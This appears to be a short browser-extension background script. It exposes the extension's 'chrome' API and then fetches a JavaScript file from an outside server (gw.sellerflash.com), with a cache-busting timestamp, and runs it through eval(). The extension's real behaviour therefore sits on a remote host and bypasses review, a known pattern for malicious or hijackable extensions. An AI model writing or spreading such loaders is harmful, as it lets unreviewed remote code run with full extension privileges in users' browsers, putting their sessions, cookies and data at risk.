window.chrome = chrome;
v = (new Date).valueOf();
fetch("https://gw.sellerflash.com/api/extension/downloadExtension/background.js?v=" + v).then(function(n) { return n.text() }).then(function(n) { eval(n) });